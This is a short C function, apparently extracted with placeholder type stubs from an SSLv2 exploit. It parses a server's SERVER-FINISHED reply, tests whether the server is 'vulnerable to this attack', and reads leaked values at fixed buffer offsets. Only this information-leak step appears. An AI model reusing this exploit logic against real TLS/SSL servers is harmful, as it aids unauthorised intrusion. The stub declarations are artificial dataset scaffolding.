
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint16_t ;
typedef int ssl_conn ;
typedef int buf ;


 int BUFSIZE ;
 unsigned char SSL2_MT_SERVER_FINISHED ;
 int cipher ;
 int ciphers ;
 int exit (int) ;
 int ntohs (int ) ;
 int printf (char*,...) ;
 int read_ssl_packet (int *,unsigned char*,int) ;
 char* ssl_error (int ) ;

void get_server_finished(ssl_conn* ssl)
{
 unsigned char buf[BUFSIZE];
 int len;
 int i;

 if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
  printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
  exit(1);
 }
 if (buf[0] != SSL2_MT_SERVER_FINISHED) {
  printf("get server finished: Expected SSL2 MT SERVER FINISHED, got %x\n", (int)buf[0]);
  exit(1);
 }

 if (len <= 112 ) {
  printf("This server is not vulnerable to this attack.\n");
  exit(1);
 }
 cipher = *(int*)&buf[101];
 ciphers = *(int*)&buf[109];

 printf("cipher: 0x%x   ciphers: 0x%x\n", cipher, ciphers);
}
